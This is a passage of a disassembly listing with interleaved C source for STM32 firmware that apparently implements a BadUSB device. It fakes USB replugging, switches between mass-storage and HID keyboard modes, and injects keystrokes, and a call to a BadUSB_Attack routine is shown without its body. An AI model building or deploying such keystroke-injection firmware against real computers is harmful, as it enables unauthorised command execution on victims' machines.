 8000628:	2001      	movs	r0, #1
 800062a:	f000 fa7f 	bl	8000b2c <BadUSB_Attack>
				  break;
 800062e:	bf00      	nop
		  flag = 0;
 8000630:	2300      	movs	r3, #0
 8000632:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000634:	f000 f89a 	bl	800076c <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000638:	e7c1      	b.n	80005be <main+0x36>
 800063a:	bf00      	nop
 800063c:	20000978 	.word	0x20000978
 8000640:	2000025c 	.word	0x2000025c
 8000644:	20000270 	.word	0x20000270
 8000648:	40022000 	.word	0x40022000

0800064c <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 800064c:	b580      	push	{r7, lr}
 800064e:	b096      	sub	sp, #88	; 0x58
 8000650:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000652:	f107 0314 	add.w	r3, r7, #20
 8000656:	2244      	movs	r2, #68	; 0x44
 8000658:	2100      	movs	r1, #0
 800065a:	4618      	mov	r0, r3
 800065c:	f00c fce8 	bl	800d030 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000660:	463b      	mov	r3, r7
 8000662:	2200      	movs	r2, #0
 8000664:	601a      	str	r2, [r3, #0]
 8000666:	605a      	str	r2, [r3, #4]
 8000668:	609a      	str	r2, [r3, #8]
 800066a:	60da      	str	r2, [r3, #12]
 800066c:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 800066e:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000672:	f003 f8e5 	bl	8003840 <HAL_PWREx_ControlVoltageScaling>
 8000676:	4603      	mov	r3, r0
 8000678:	2b00      	cmp	r3, #0
 800067a:	d001      	beq.n	8000680 <SystemClock_Config+0x34>
  {
    Error_Handler();
 800067c:	f000 fb2a 	bl	8000cd4 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000680:	f003 f8c0 	bl	8003804 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000684:	4b21      	ldr	r3, [pc, #132]	; (800070c <SystemClock_Config+0xc0>)
 8000686:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800068a:	4a20      	ldr	r2, [pc, #128]	; (800070c <SystemClock_Config+0xc0>)
 800068c:	f023 0318 	bic.w	r3, r3, #24
 8000690:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000694:	2314      	movs	r3, #20
 8000696:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000698:	2301      	movs	r3, #1
 800069a:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 800069c:	2301      	movs	r3, #1
 800069e:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 80006a0:	2300      	movs	r3, #0
 80006a2:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 80006a4:	2360      	movs	r3, #96	; 0x60
 80006a6:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 80006a8:	2302      	movs	r3, #2
 80006aa:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 80006ac:	2301      	movs	r3, #1
 80006ae:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 80006b0:	2301      	movs	r3, #1
 80006b2:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 80006b4:	2318      	movs	r3, #24
 80006b6:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 80006b8:	2307      	movs	r3, #7
 80006ba:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 80006bc:	2302      	movs	r3, #2
 80006be:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 80006c0:	2302      	movs	r3, #2
 80006c2:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 80006c4:	f107 0314 	add.w	r3, r7, #20
 80006c8:	4618      	mov	r0, r3
 80006ca:	f003 f91f 	bl	800390c <HAL_RCC_OscConfig>
 80006ce:	4603      	mov	r3, r0
 80006d0:	2b00      	cmp	r3, #0
 80006d2:	d001      	beq.n	80006d8 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006d4:	f000 fafe 	bl	8000cd4 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006d8:	230f      	movs	r3, #15
 80006da:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006dc:	2303      	movs	r3, #3
 80006de:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006e0:	2300      	movs	r3, #0
 80006e2:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006e4:	2300      	movs	r3, #0
 80006e6:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006e8:	2300      	movs	r3, #0
 80006ea:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006ec:	463b      	mov	r3, r7
 80006ee:	2102      	movs	r1, #2
 80006f0:	4618      	mov	r0, r3
 80006f2:	f003 fd1f 	bl	8004134 <HAL_RCC_ClockConfig>
 80006f6:	4603      	mov	r3, r0
 80006f8:	2b00      	cmp	r3, #0
 80006fa:	d001      	beq.n	8000700 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006fc:	f000 faea 	bl	8000cd4 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000700:	f004 f932 	bl	8004968 <HAL_RCCEx_EnableMSIPLLMode>
}
 8000704:	bf00      	nop
 8000706:	3758      	adds	r7, #88	; 0x58
 8000708:	46bd      	mov	sp, r7
 800070a:	bd80      	pop	{r7, pc}
 800070c:	40021000 	.word	0x40021000

08000710 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 8000710:	b580      	push	{r7, lr}
 8000712:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 8000714:	2200      	movs	r2, #0
 8000716:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 800071a:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800071e:	f001 fa95 	bl	8001c4c <HAL_GPIO_WritePin>
}
 8000722:	bf00      	nop
 8000724:	bd80      	pop	{r7, pc}

08000726 <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 8000726:	b580      	push	{r7, lr}
 8000728:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 800072a:	2201      	movs	r2, #1
 800072c:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000730:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000734:	f001 fa8a 	bl	8001c4c <HAL_GPIO_WritePin>
}
 8000738:	bf00      	nop
 800073a:	bd80      	pop	{r7, pc}

0800073c <SwitchToHID>:

void SwitchToHID(){
 800073c:	b580      	push	{r7, lr}
 800073e:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000740:	f7ff ffe6 	bl	8000710 <SimulateUSB_unplug>
	isMSC = 0;
 8000744:	4b08      	ldr	r3, [pc, #32]	; (8000768 <SwitchToHID+0x2c>)
 8000746:	2200      	movs	r2, #0
 8000748:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800074a:	2032      	movs	r0, #50	; 0x32
 800074c:	f000 fd66 	bl	800121c <HAL_Delay>
	SimulateUSB_plugin();
 8000750:	f7ff ffe9 	bl	8000726 <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000754:	f000 fbb8 	bl	8000ec8 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000758:	f00b fe32 	bl	800c3c0 <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 800075c:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000760:	f000 fd5c 	bl	800121c <HAL_Delay>
}
 8000764:	bf00      	nop
 8000766:	bd80      	pop	{r7, pc}
 8000768:	20000978 	.word	0x20000978

0800076c <SwitchToMSC>:

void SwitchToMSC(){
 800076c:	b580      	push	{r7, lr}
 800076e:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000770:	f7ff ffce 	bl	8000710 <SimulateUSB_unplug>
	isMSC = 1;
 8000774:	4b07      	ldr	r3, [pc, #28]	; (8000794 <SwitchToMSC+0x28>)
 8000776:	2201      	movs	r2, #1
 8000778:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800077a:	2032      	movs	r0, #50	; 0x32
 800077c:	f000 fd4e 	bl	800121c <HAL_Delay>
	SimulateUSB_plugin();
 8000780:	f7ff ffd1 	bl	8000726 <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 8000784:	f00b fe4c 	bl	800c420 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000788:	f640 30b8 	movw	r0, #3000	; 0xbb8
 800078c:	f000 fd46 	bl	800121c <HAL_Delay>
}
 8000790:	bf00      	nop
 8000792:	bd80      	pop	{r7, pc}
 8000794:	20000978 	.word	0x20000978

08000798 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000798:	b580      	push	{r7, lr}
 800079a:	b0a4      	sub	sp, #144	; 0x90
 800079c:	af00      	add	r7, sp, #0
 800079e:	4603      	mov	r3, r0
 80007a0:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007a2:	220f      	movs	r2, #15
 80007a4:	2100      	movs	r1, #0
 80007a6:	4821      	ldr	r0, [pc, #132]	; (800082c <Get_Single_Descriptor+0x94>)
 80007a8:	f00c fc42 	bl	800d030 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007ac:	4a20      	ldr	r2, [pc, #128]	; (8000830 <Get_Single_Descriptor+0x98>)
 80007ae:	f107 0308 	add.w	r3, r7, #8
 80007b2:	4611      	mov	r1, r2
 80007b4:	2285      	movs	r2, #133	; 0x85
 80007b6:	4618      	mov	r0, r3
 80007b8:	f00c fc66 	bl	800d088 <memcpy>
	Convert2CapsMap(Map);
 80007bc:	f107 0308 	add.w	r3, r7, #8
 80007c0:	4618      	mov	r0, r3
 80007c2:	f000 f93f 	bl	8000a44 <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 80007c6:	79fb      	ldrb	r3, [r7, #7]
 80007c8:	3390      	adds	r3, #144	; 0x90
 80007ca:	443b      	add	r3, r7
 80007cc:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 80007d0:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80007d4:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007d8:	091b      	lsrs	r3, r3, #4
 80007da:	b2db      	uxtb	r3, r3
 80007dc:	461a      	mov	r2, r3
 80007de:	4b13      	ldr	r3, [pc, #76]	; (800082c <Get_Single_Descriptor+0x94>)
 80007e0:	5c9b      	ldrb	r3, [r3, r2]
 80007e2:	b25a      	sxtb	r2, r3
 80007e4:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007e8:	f003 0307 	and.w	r3, r3, #7
 80007ec:	2101      	movs	r1, #1
 80007ee:	fa01 f303 	lsl.w	r3, r1, r3
 80007f2:	b25b      	sxtb	r3, r3
 80007f4:	4313      	orrs	r3, r2
 80007f6:	b259      	sxtb	r1, r3
 80007f8:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007fc:	091b      	lsrs	r3, r3, #4
 80007fe:	b2db      	uxtb	r3, r3
 8000800:	461a      	mov	r2, r3
 8000802:	b2c9      	uxtb	r1, r1
 8000804:	4b09      	ldr	r3, [pc, #36]	; (800082c <Get_Single_Descriptor+0x94>)
 8000806:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000808:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 800080c:	f003 0308 	and.w	r3, r3, #8
 8000810:	2b00      	cmp	r3, #0
 8000812:	d006      	beq.n	8000822 <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 8000814:	4b05      	ldr	r3, [pc, #20]	; (800082c <Get_Single_Descriptor+0x94>)
 8000816:	781b      	ldrb	r3, [r3, #0]
 8000818:	f043 0302 	orr.w	r3, r3, #2
 800081c:	b2da      	uxtb	r2, r3
 800081e:	4b03      	ldr	r3, [pc, #12]	; (800082c <Get_Single_Descriptor+0x94>)
 8000820:	701a      	strb	r2, [r3, #0]
}
 8000822:	bf00      	nop
 8000824:	3790      	adds	r7, #144	; 0x90
 8000826:	46bd      	mov	sp, r7
 8000828:	bd80      	pop	{r7, pc}
 800082a:	bf00      	nop
 800082c:	2000025c 	.word	0x2000025c
 8000830:	0800d0bc 	.word	0x0800d0bc

08000834 <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 8000834:	b580      	push	{r7, lr}
 8000836:	b0a6      	sub	sp, #152	; 0x98
 8000838:	af00      	add	r7, sp, #0
 800083a:	6078      	str	r0, [r7, #4]
 800083c:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800083e:	220f      	movs	r2, #15
 8000840:	2100      	movs	r1, #0
 8000842:	482a      	ldr	r0, [pc, #168]	; (80008ec <Get_Multi_Descriptor+0xb8>)
 8000844:	f00c fbf4 	bl	800d030 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000848:	4a29      	ldr	r2, [pc, #164]	; (80008f0 <Get_Multi_Descriptor+0xbc>)
 800084a:	f107 030c 	add.w	r3, r7, #12
 800084e:	4611      	mov	r1, r2
 8000850:	2285      	movs	r2, #133	; 0x85
 8000852:	4618      	mov	r0, r3
 8000854:	f00c fc18 	bl	800d088 <memcpy>
	Convert2CapsMap(Map);
 8000858:	f107 030c 	add.w	r3, r7, #12
 800085c:	4618      	mov	r0, r3
 800085e:	f000 f8f1 	bl	8000a44 <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 8000862:	2300      	movs	r3, #0
 8000864:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000868:	e036      	b.n	80008d8 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 800086a:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800086e:	687a      	ldr	r2, [r7, #4]
 8000870:	4413      	add	r3, r2
 8000872:	781b      	ldrb	r3, [r3, #0]
 8000874:	3398      	adds	r3, #152	; 0x98
 8000876:	443b      	add	r3, r7
 8000878:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 800087c:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000880:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000884:	091b      	lsrs	r3, r3, #4
 8000886:	b2db      	uxtb	r3, r3
 8000888:	461a      	mov	r2, r3
 800088a:	4b18      	ldr	r3, [pc, #96]	; (80008ec <Get_Multi_Descriptor+0xb8>)
 800088c:	5c9b      	ldrb	r3, [r3, r2]
 800088e:	b25a      	sxtb	r2, r3
 8000890:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000894:	f003 0307 	and.w	r3, r3, #7
 8000898:	2101      	movs	r1, #1
 800089a:	fa01 f303 	lsl.w	r3, r1, r3
 800089e:	b25b      	sxtb	r3, r3
 80008a0:	4313      	orrs	r3, r2
 80008a2:	b259      	sxtb	r1, r3
 80008a4:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008a8:	091b      	lsrs	r3, r3, #4
 80008aa:	b2db      	uxtb	r3, r3
 80008ac:	461a      	mov	r2, r3
 80008ae:	b2c9      	uxtb	r1, r1
 80008b0:	4b0e      	ldr	r3, [pc, #56]	; (80008ec <Get_Multi_Descriptor+0xb8>)
 80008b2:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 80008b4:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008b8:	f003 0308 	and.w	r3, r3, #8
 80008bc:	2b00      	cmp	r3, #0
 80008be:	d006      	beq.n	80008ce <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 80008c0:	4b0a      	ldr	r3, [pc, #40]	; (80008ec <Get_Multi_Descriptor+0xb8>)
 80008c2:	781b      	ldrb	r3, [r3, #0]
 80008c4:	f043 0302 	orr.w	r3, r3, #2
 80008c8:	b2da      	uxtb	r2, r3
 80008ca:	4b08      	ldr	r3, [pc, #32]	; (80008ec <Get_Multi_Descriptor+0xb8>)
 80008cc:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 80008ce:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80008d2:	3301      	adds	r3, #1
 80008d4:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008d8:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008dc:	683b      	ldr	r3, [r7, #0]
 80008de:	429a      	cmp	r2, r3
 80008e0:	dbc3      	blt.n	800086a <Get_Multi_Descriptor+0x36>
	}
}
 80008e2:	bf00      	nop
 80008e4:	bf00      	nop
 80008e6:	3798      	adds	r7, #152	; 0x98
 80008e8:	46bd      	mov	sp, r7
 80008ea:	bd80      	pop	{r7, pc}
 80008ec:	2000025c 	.word	0x2000025c
 80008f0:	0800d0bc 	.word	0x0800d0bc

080008f4 <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008f4:	b580      	push	{r7, lr}
 80008f6:	b082      	sub	sp, #8
 80008f8:	af00      	add	r7, sp, #0
 80008fa:	4603      	mov	r3, r0
 80008fc:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008fe:	79fb      	ldrb	r3, [r7, #7]
 8000900:	4618      	mov	r0, r3
 8000902:	f7ff ff49 	bl	8000798 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000906:	220f      	movs	r2, #15
 8000908:	4903      	ldr	r1, [pc, #12]	; (8000918 <SimulateKeyPress+0x24>)
 800090a:	4804      	ldr	r0, [pc, #16]	; (800091c <SimulateKeyPress+0x28>)
 800090c:	f008 f896 	bl	8008a3c <USBD_CUSTOM_HID_SendReport>
}
 8000910:	bf00      	nop
 8000912:	3708      	adds	r7, #8
 8000914:	46bd      	mov	sp, r7
 8000916:	bd80      	pop	{r7, pc}
 8000918:	2000025c 	.word	0x2000025c
 800091c:	200003c0 	.word	0x200003c0

08000920 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000920:	b580      	push	{r7, lr}
 8000922:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000924:	220f      	movs	r2, #15
 8000926:	2100      	movs	r1, #0
 8000928:	4804      	ldr	r0, [pc, #16]	; (800093c <SimulateKeyRelease+0x1c>)
 800092a:	f00c fb81 	bl	800d030 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800092e:	220f      	movs	r2, #15
 8000930:	4902      	ldr	r1, [pc, #8]	; (800093c <SimulateKeyRelease+0x1c>)
 8000932:	4803      	ldr	r0, [pc, #12]	; (8000940 <SimulateKeyRelease+0x20>)
 8000934:	f008 f882 	bl	8008a3c <USBD_CUSTOM_HID_SendReport>
}
 8000938:	bf00      	nop
 800093a:	bd80      	pop	{r7, pc}
 800093c:	2000025c 	.word	0x2000025c
 8000940:	200003c0 	.word	0x200003c0

08000944 <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 8000944:	b580      	push	{r7, lr}
 8000946:	b082      	sub	sp, #8
 8000948:	af00      	add	r7, sp, #0
 800094a:	4603      	mov	r3, r0
 800094c:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 800094e:	79fb      	ldrb	r3, [r7, #7]
 8000950:	4618      	mov	r0, r3
 8000952:	f7ff ffcf 	bl	80008f4 <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000956:	2023      	movs	r0, #35	; 0x23
 8000958:	f000 fc60 	bl	800121c <HAL_Delay>
	SimulateKeyRelease();
 800095c:	f7ff ffe0 	bl	8000920 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000960:	2023      	movs	r0, #35	; 0x23
 8000962:	f000 fc5b 	bl	800121c <HAL_Delay>
}
 8000966:	bf00      	nop
 8000968:	3708      	adds	r7, #8
 800096a:	46bd      	mov	sp, r7
 800096c:	bd80      	pop	{r7, pc}
	...

08000970 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000970:	b580      	push	{r7, lr}
 8000972:	b082      	sub	sp, #8
 8000974:	af00      	add	r7, sp, #0
 8000976:	6078      	str	r0, [r7, #4]
 8000978:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 800097a:	6839      	ldr	r1, [r7, #0]
 800097c:	6878      	ldr	r0, [r7, #4]
 800097e:	f7ff ff59 	bl	8000834 <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 8000982:	e002      	b.n	800098a <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 8000984:	2080      	movs	r0, #128	; 0x80
 8000986:	f7ff ffdd 	bl	8000944 <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 800098a:	4b0c      	ldr	r3, [pc, #48]	; (80009bc <SimulateShortcutKey+0x4c>)
 800098c:	781b      	ldrb	r3, [r3, #0]
 800098e:	f003 0302 	and.w	r3, r3, #2
 8000992:	2b00      	cmp	r3, #0
 8000994:	d0f6      	beq.n	8000984 <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000996:	220f      	movs	r2, #15
 8000998:	4909      	ldr	r1, [pc, #36]	; (80009c0 <SimulateShortcutKey+0x50>)
 800099a:	480a      	ldr	r0, [pc, #40]	; (80009c4 <SimulateShortcutKey+0x54>)
 800099c:	f008 f84e 	bl	8008a3c <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80009a0:	2023      	movs	r0, #35	; 0x23
 80009a2:	f000 fc3b 	bl	800121c <HAL_Delay>
	SimulateKeyRelease();
 80009a6:	f7ff ffbb 	bl	8000920 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 80009aa:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80009ae:	f000 fc35 	bl	800121c <HAL_Delay>
}
 80009b2:	bf00      	nop
 80009b4:	3708      	adds	r7, #8
 80009b6:	46bd      	mov	sp, r7
 80009b8:	bd80      	pop	{r7, pc}
 80009ba:	bf00      	nop
 80009bc:	2000026c 	.word	0x2000026c
 80009c0:	2000025c 	.word	0x2000025c
 80009c4:	200003c0 	.word	0x200003c0

080009c8 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 80009c8:	b580      	push	{r7, lr}
 80009ca:	b084      	sub	sp, #16
 80009cc:	af00      	add	r7, sp, #0
 80009ce:	60f8      	str	r0, [r7, #12]
 80009d0:	60b9      	str	r1, [r7, #8]
 80009d2:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009d4:	687b      	ldr	r3, [r7, #4]
 80009d6:	2200      	movs	r2, #0
 80009d8:	601a      	str	r2, [r3, #0]
 80009da:	e025      	b.n	8000a28 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009dc:	4b17      	ldr	r3, [pc, #92]	; (8000a3c <SimulateKeyStrokes+0x74>)
 80009de:	781b      	ldrb	r3, [r3, #0]
 80009e0:	f003 0302 	and.w	r3, r3, #2
 80009e4:	2b00      	cmp	r3, #0
 80009e6:	d102      	bne.n	80009ee <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009e8:	2080      	movs	r0, #128	; 0x80
 80009ea:	f7ff ffab 	bl	8000944 <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009ee:	687b      	ldr	r3, [r7, #4]
 80009f0:	681b      	ldr	r3, [r3, #0]
 80009f2:	461a      	mov	r2, r3
 80009f4:	68fb      	ldr	r3, [r7, #12]
 80009f6:	4413      	add	r3, r2
 80009f8:	781b      	ldrb	r3, [r3, #0]
 80009fa:	4618      	mov	r0, r3
 80009fc:	f7ff ffa2 	bl	8000944 <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000a00:	4b0f      	ldr	r3, [pc, #60]	; (8000a40 <SimulateKeyStrokes+0x78>)
 8000a02:	681b      	ldr	r3, [r3, #0]
 8000a04:	2b01      	cmp	r3, #1
 8000a06:	d10a      	bne.n	8000a1e <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000a08:	4b0d      	ldr	r3, [pc, #52]	; (8000a40 <SimulateKeyStrokes+0x78>)
 8000a0a:	2200      	movs	r2, #0
 8000a0c:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000a0e:	687b      	ldr	r3, [r7, #4]
 8000a10:	681b      	ldr	r3, [r3, #0]
 8000a12:	1e5a      	subs	r2, r3, #1
 8000a14:	687b      	ldr	r3, [r7, #4]
 8000a16:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000a18:	2081      	movs	r0, #129	; 0x81
 8000a1a:	f7ff ff93 	bl	8000944 <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000a1e:	687b      	ldr	r3, [r7, #4]
 8000a20:	681b      	ldr	r3, [r3, #0]
 8000a22:	1c5a      	adds	r2, r3, #1
 8000a24:	687b      	ldr	r3, [r7, #4]
 8000a26:	601a      	str	r2, [r3, #0]
 8000a28:	687b      	ldr	r3, [r7, #4]
 8000a2a:	681b      	ldr	r3, [r3, #0]
 8000a2c:	68ba      	ldr	r2, [r7, #8]
 8000a2e:	429a      	cmp	r2, r3
 8000a30:	dcd4      	bgt.n	80009dc <SimulateKeyStrokes+0x14>
		}
	}
}
 8000a32:	bf00      	nop
 8000a34:	bf00      	nop
 8000a36:	3710      	adds	r7, #16
 8000a38:	46bd      	mov	sp, r7
 8000a3a:	bd80      	pop	{r7, pc}
 8000a3c:	2000026c 	.word	0x2000026c
 8000a40:	2000027c 	.word	0x2000027c

08000a44 <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a44:	b480      	push	{r7}
 8000a46:	b085      	sub	sp, #20
 8000a48:	af00      	add	r7, sp, #0
 8000a4a:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a4c:	2341      	movs	r3, #65	; 0x41
 8000a4e:	73fb      	strb	r3, [r7, #15]
 8000a50:	e01a      	b.n	8000a88 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a52:	7bfb      	ldrb	r3, [r7, #15]
 8000a54:	687a      	ldr	r2, [r7, #4]
 8000a56:	4413      	add	r3, r2
 8000a58:	781a      	ldrb	r2, [r3, #0]
 8000a5a:	7bfb      	ldrb	r3, [r7, #15]
 8000a5c:	6879      	ldr	r1, [r7, #4]
 8000a5e:	440b      	add	r3, r1
